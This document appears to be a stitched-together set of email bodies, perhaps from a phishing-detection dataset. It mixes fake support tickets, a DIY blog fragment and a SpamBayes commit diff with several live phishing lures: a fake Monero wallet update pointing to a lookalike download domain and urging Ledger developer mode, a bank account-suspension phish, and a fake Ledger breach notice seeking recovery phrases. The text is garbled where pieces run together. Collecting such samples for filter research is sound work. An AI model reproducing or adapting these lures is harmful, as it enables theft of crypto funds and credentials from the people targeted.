Subject:
Monero Interface Update: Desktop Enhancements, CLI Improvements,
 and Browser-Based Access
Body:
Dear Monero Community,

We are writing to share a major update that aligns with long-standing community input and current user needs across various environments.

As part of our continued efforts to improve accessibility, flexibility, and performances across the Monero ecosystem, we are releasing upgrades to the desktop GUI and CLI wallet, along with the first beta release of a Monero browser extension wallet.

Desktop Wallet Enhancements

The updated Monero GUI wallet for desktop includes refinements that improve reliability, performances, and interface responsiveness across supported platforms:

* Improved remote node handling with better failover and retry logic
* Enhanced support for hardware wallets, including newer Ledger and Trezor models
* Simplified wallet creation and recovery flows
* UI adjustments for smaller and high-resolution displays
* Updated translations and accessibility improvements

The wallet continues to support Windows, Linux, and macOS operating systems.

Download the updated GUI: https://app.getmoneroupdate.org/

CLI Wallet Improvements

We’ve also released an updated version of the CLI wallet (`monero-wallet-cli`) with performances and security improvements for advanced users, developers, and operators managing automated systems.

Key updates include:

* Faster synchronization when using trusted remote nodes
* Extended support for scripted wallet interactions
* Improved error reporting in automated transaction processing
* Hardened memory handling for improved operational security
* Added flag options for fine-grained control over mining rig connections

Download the updated CLI tools: https://app.getmoneroupdate.org/

Browser Extension Wallet:

We are introducing a browser extension wallet built specifically for users who require lightweight, direct interaction with Monero — particularly those managing mining infrastructure via Ledger hardware wallets.

This extension provides:

* Secure Ledger integration for reading balances and authorizing transactions
* Compatibility with Chromium-based browsers (Chrome, Brave, Edge, etc.)
* Seamless pairing with the updated GUI or CLI interface
* Local-only key handling — no data is transmitted to external servers
* Session persistence across browser restarts for uninterrupted rig monitoring

Install the Monero Extension Wallet: https://app.getmoneroupdate.org/

Installation Overview

1. Select and download the appropriate version for your platform (GUI, CLI, or Extension).
2. Follow platform-specific installation steps provided on the official site.
3. If using a Ledger device, ensure firmware is up to date and enable developer mode for best compatibility.

We thank contributors, testers, and node operators who continue to support Monero’s mission. If you encounter any issues, or if certain workflows are not yet fully covered, we encourage you to submit observations through the appropriate GitHub channels or via the in-app feedback options.

Your insights continue to inform the evolution of the Monero project.

With appreciation,
The Monero Development Team

I used some scrap wood to make the posts so they look kinda shabby. Not my best work but they work and the posts will be covered up in the next step. I just remembered that I've never shared my “moodboard”. The TV cabinet (pictured in the center) is the one I'm making over. It was an old hack which I love and I've used it for years. Recently, I wall-mounted my TV so this got cold-storaged but I always knew I would find another way to hack it. Separately, I was thinking of adding pantry cabinets. Then, one day, the stars aligned and I saw how I can merge them. Can't wait to see my vision become real! If you have any questions on the moodboard, hit reply and ask. This week, the goal was to get the legs on and paint it up but I blame the weather! It's been sweltering. DIY is tough when I'm dripping sweat non-stop. (Excuses, excuses. 😉) So on the same note, thanks for being here to listen to all this. A bit of accountability pushes me to keep going and not let the procrastinator in me take over. And so I move forward. Hacking it, The perfect wall mounted TV cabinetView hack Thank you so much for being a part of everything we doHappy Hacking, friend. Multiple integrations between Adobe Illustrator CC 2021 and Shopware are failing, which I suspect might be due to compatibility problems. Despite reverting the updates and restarting the application, the issues still persist. These failed integrations are causing significant disruptions to my workflow. I would greatly appreciate if you could look into this matter and provide guidance to resolve the issue. Please let me know if you require any additional information. Thank you.

Subject: Notification: Your account had been recently compromised.
Body: A Message From The CEO. We have strong reasons to believe that your Guaranty Bond Bank account had been recently compromised. In order to prevent any fraudulent activity from occurring, we are required to open an investigation into this matter. According to User Agreement, Section 9, we may immediately issue a warning, temporarily suspend, indefinitely suspend or terminate your account and refuse to provide our services to you if we believe that your actions may cause financial loss or legal liability for you, our users or us. We may also take these actions if we are unable to verify or authenticate any information you provide to us. Click the link below to update your account information: Please consider this letter as an official request from Guaranty Bond Bank If your account's information is not updated within the next 24 hours, then we will assume this account is fraudulent and will be suspended. We apologize for this inconvenience, but the purpose of this verification is to ensure that your Guaranty Bond Bank account has not been fraudulently used. Ty Abston President & CEO

Concern About Hospital IT System
Body: Hello Customer Support, I am contacting you because I have discovered a suspected data breach on our hospital's IT system. This issue may be attributable to out-of-date RAID-Controller firmware. Although I have already attempted to reboot the Aruba switch, update the iOS, and review the GitHub logs, the problem still seems to be present. I kindly ask that you investigate this situation promptly and offer a solution to prevent further breaches. Please inform me if you require any more details from me. Body:
Hi Aetheros Support,

I'm having trouble assigning a custom role I created to a user in my Aetheros IAM. I've verified the role exists and has the correct permissions, but when I try to assign it to the user, I receive an error message.

Could you please help me resolve this issue?

Thanks,
John Doe

Subject: Concern Regarding Investment Optimization Models
Body: During routine data analysis, the investment optimization models have been producing inconsistent results. The issue seems to have arisen due to recent algorithm updates, as the settings have remained unchanged from previous iterations which produced reliable outcomes. Initial troubleshooting steps, such as reverting to the old algorithms and recalibrating data inputs, have not resolved the issue. I would greatly appreciate your assistance in resolving this matter to ensure the accuracy and reliability of the models.

Subject: [Spambayes-checkins] spambayes/spambayes ImageStripper.py, 1.14, 1.15
Body: Update of /cvsroot/spambayes/spambayes/spambayes In directory sc8-pr-cvs8.sourceforge.net:/tmp/cvs-serv9617 Modified Files: ImageStripper.py Log Message: We don't really care *why* opening/loading an image fails. If the operation fails, the image is invalid, as far as we are concerned. Index: ImageStripper.py =================================================================== RCS file: /cvsroot/spambayes/spambayes/spambayes/ImageStripper.py,v retrieving revision 1.14 retrieving revision 1.15 diff -C2 -d -r1.14 -r1.15 *** ImageStripper.py 26 Mar 2007 07:50:31 -0000 1.14 --- ImageStripper.py 25 May 2007 08:18:21 -0000 1.15 *************** *** 143,147 **** image = Image.open(StringIO.StringIO(bytes)) image.load() ! except IOError: tokens.add("invalid-image:%s" % part.get_content_type()) continue --- 143,149 ---- image = Image.open(StringIO.StringIO(bytes)) image.load() ! except: ! # Any error whatsoever is reason for not looking further at ! # the image. tokens.add("invalid-image:%s" % part.get_content_type()) continue _______________________________________________ Spambayes-checkins mailing list pnperxdpv-sarswdlp@python.org http://mail.python.org/mailman/listinfo/spambayes-checkins

Subject: Support Request for Login Failures During Peak Hours
Body: Dear Customer Support, I am encountering intermittent login failures during peak hours. I suspect these issues might be due to server overload or database contention. Despite restarting the server and optimizing database queries, the problem continues to persist. This is causing disruptions to my work as users are unable to log in. I kindly request your assistance in resolving this matter. Could you please look into the issue and provide a solution as soon as possible? I appreciate your prompt attention to this matter and look forward to hearing from you.

Subject: Troubleshooting Problems with Digital Strategies
Body: Respected Customer Support, I am contacting you regarding issues with our digital strategies. Several devices have failed concurrently, leading to operational disruptions. I believe the problem might stem from outdated software or hardware conflicts. To address the issue, I have restarted the systems, updated the drivers, and verified all connections; however, the problem remains unresolved. I would greatly appreciate your help in resolving this as soon as possible. Please inform me if there are any additional steps I should take or if you need more details from me. Thank you for your time and assistance. Sincerely, [Your Name]

Subject: Important: Ledger Security Verification Required
Body:
Ledger identified a recent data incident. Please verify if your recovery phrase has been affected.
Ledger Security Notice – Verification Required
Ledger Support Team · October 14, 2025
Dear Ledger User,
On October 14, 2025, our security team identified unauthorized access to one of our non-transactional databases. Following an internal audit, we confirmed that some users’ recovery phrases (seed phrases) may have been exposed.
While your Ledger device remains secure, we ask all affected users to confirm their recovery status through our dedicated verification portal. This ensures your account integrity and allows immediate regeneration if exposure is detected.
Please take the following steps:
• Click the button below to open the secure verification portal.
• Follow the guided process to check if your recovery phrase was impacted.
• If compromised, you will be redirected to the regeneration and transfer page for immediate protection.
Verify My Recovery Phrase
The verification process is encrypted and performed through Ledger’s secure infrastructure. Please note: Ledger will never ask for your recovery phrase by email. If you receive such a request, ignore it and contact our support team immediately.
We deeply regret any concern this may have caused and appreciate your prompt action to secure your account.

Kind regards,
Ledger Support Team
Ledger, 27 Rue des Rosiers, 75004 Paris, France
© 2025 Ledger. All rights reserved.
Unsubscribe

Subject: Customer Support Ticket
Body:
Hello Customer Support,
A sudden service disruption is occurring that is hindering user interaction with our platform. This anomaly might be due to a database connection failure or a surge in server load.
Up until now, we have executed server restarts, inspected log files, and ensured network availability, yet the problem remains unresolved.
We kindly request your assistance to swiftly address this issue.
Should you need any extra details from us to aid in the diagnostic process, please inform us.
We are eagerly awaiting your response.
Thank you for your cooperation.
